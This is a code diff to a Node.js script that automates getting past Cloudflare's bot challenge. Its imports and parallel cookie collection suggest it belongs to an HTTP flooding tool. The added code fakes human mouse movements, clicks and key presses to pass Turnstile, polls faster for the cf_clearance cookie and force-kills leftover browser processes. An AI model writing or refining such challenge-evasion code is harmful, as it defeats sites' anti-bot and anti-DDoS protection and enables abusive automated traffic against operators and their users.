@@ -4,6 +4,7 @@ const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
+const { exec } = require("child_process");  // Added for potential fallback killing
 
 
 const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
@@ -320,6 +321,22 @@ function shuffleObject(obj) {
     return shuffledObject;
 }
 
+// Helper to force-kill browser process
+async function killBrowserProcess(browser) {
+    if (browser && browser.process()) {
+        const proc = browser.process();
+        const pid = proc.pid;
+        if (pid) {
+            console.log(`\x1b[33mForce-killing browser process PID: ${pid}\x1b[0m`);
+            proc.kill('SIGKILL');
+            // Fallback for cross-platform (e.g., on Windows or stubborn processes)
+            exec(`kill -9 ${pid}`, (err) => {
+                if (err) console.log(`\x1b[31mKill error: ${err.message}\x1b[0m`);
+            });
+        }
+    }
+}
+
 // Cloudflare Bypass
 async function bypassCloudflareOnce(attemptNum = 1) {
     let response = null;
@@ -330,7 +347,7 @@ async function bypassCloudflareOnce(attemptNum = 1) {
         console.log(`\x1b[33mStarting bypass attempt ${attemptNum}...\x1b[0m`);
         
         response = await connect({
-            headless: true,
+            headless: false,  // Reverted to false for potentially faster challenge solving (as in original script)
             args: [
                 '--no-sandbox',
                 '--disable-setuid-sandbox',
@@ -379,27 +396,41 @@ async function bypassCloudflareOnce(attemptNum = 1) {
         try {
             await page.goto(args.target, { 
                 waitUntil: 'domcontentloaded',
-                timeout: 30000  // Reduced timeout to fail faster if stuck
+                timeout: 60000  // Reverted to 60s for more time on slow loads
             });
         } catch (navError) {
             console.log(`\x1b[33mAccess warning: ${navError.message}\x1b[0m`);
         }
         
+        // Simulate human behavior to speed up challenge resolution (e.g., for Turnstile)
+        console.log("\x1b[33mSimulating human behavior...\x1b[0m");
+        for (let i = 0; i < 3; i++) {  // Multiple movements for realism
+            await page.mouse.move(
+                Math.random() * 1920,
+                Math.random() * 1080,
+                { steps: Math.floor(Math.random() * 20) + 10 }
+            );
+            await new Promise(r => setTimeout(r, Math.random() * 500 + 200));  // Random short delays
+        }
+        await page.mouse.click(Math.random() * 1920, Math.random() * 1080);  // Random click
+        await page.keyboard.press('ArrowDown');  // Scroll down
+        await new Promise(r => setTimeout(r, Math.random() * 2000 + 1000));  // Wait 1-3s
+        
         console.log("\x1b[33mChecking Cloudflare challenge...\x1b[0m");
         
         let challengeCompleted = false;
         let checkCount = 0;
-        const maxChecks = 60;  // Reduced max checks to 30s max wait
+        const maxChecks = 600;  // Up to 60s with faster polling
         
         while (!challengeCompleted && checkCount < maxChecks) {
-            await new Promise(r => setTimeout(r, 500));
+            await new Promise(r => setTimeout(r, 100));  // Reduced to 100ms for faster detection
             
             try {
                 const cookies = await page.cookies();
                 const cfClearance = cookies.find(c => c.name === "cf_clearance");
                 
                 if (cfClearance) {
-                    console.log(`\x1b[32mFound cookie after ${(checkCount * 0.5).toFixed(1)}s!\x1b[0m`);
+                    console.log(`\x1b[32mFound cookie after ${(checkCount * 0.1).toFixed(1)}s!\x1b[0m`);
                     challengeCompleted = true;
                     break;
                 }
@@ -424,15 +455,15 @@ async function bypassCloudflareOnce(attemptNum = 1) {
             
             checkCount++;
             
-            if (checkCount % 10 === 0) {
-                console.log(`\x1b[33mStill checking... (${(checkCount * 0.5).toFixed(1)}s elapsed)\x1b[0m`);
+            if (checkCount % 50 === 0) {  // Log every 5s
+                console.log(`\x1b[33mStill checking... (${(checkCount * 0.1).toFixed(1)}s elapsed)\x1b[0m`);
             }
         }
         
         await new Promise(r => setTimeout(r, 1000));
         
         const cookies = await page.cookies();
-        console.log(`\x1b[36mFound ${cookies.length} cookies in ${(checkCount * 0.5).toFixed(1)}s\x1b[0m`);
+        console.log(`\x1b[36mFound ${cookies.length} cookies in ${(checkCount * 0.1).toFixed(1)}s\x1b[0m`);
         
         const cfClearance = cookies.find(c => c.name === "cf_clearance");
         if (cfClearance) {
@@ -450,11 +481,14 @@ async function bypassCloudflareOnce(attemptNum = 1) {
         await page.close();
         await browser.close();
         
+        // Force-kill the browser process
+        await killBrowserProcess(browser);
+        
         // Force Node GC
         if (global.gc) global.gc();
         
-        // Add delay for system cleanup
-        await new Promise(r => setTimeout(r, 2000));
+        // Increased delay for system cleanup
+        await new Promise(r => setTimeout(r, 3000));
         
         return {
             cookies: cookies,
@@ -475,14 +509,17 @@ async function bypassCloudflareOnce(attemptNum = 1) {
                 });
                 await page.close();
             }
-            if (browser) await browser.close();
+            if (browser) {
+                await browser.close();
+                await killBrowserProcess(browser);
+            }
         } catch (cleanupError) {}
         
         // Force GC
         if (global.gc) global.gc();
         
-        // Add delay even on error
-        await new Promise(r => setTimeout(r, 2000));
+        // Delay even on error
+        await new Promise(r => setTimeout(r, 3000));
         
         return {
             cookies: [],
@@ -501,7 +538,7 @@ async function bypassCloudflareParallel(totalCount) {
     const results = [];
     let attemptCount = 0;
     
-    const concurrentBypassSessions = 1;  // Set to 1 for sequential processing
+    const concurrentBypassSessions = 1;  
     
     while (results.length < totalCount) {
         const remaining = totalCount - results.length;
@@ -531,7 +568,7 @@ async function bypassCloudflareParallel(totalCount) {
         
         if (results.length < totalCount) {
             console.log(`\x1b[33mWaiting 10s before next batch for memory cleanup...\x1b[0m`);
-            await new Promise(r => setTimeout(r, 10000));  // Increased to 10s
+            await new Promise(r => setTimeout(r, 10000));  
         }
     }
     
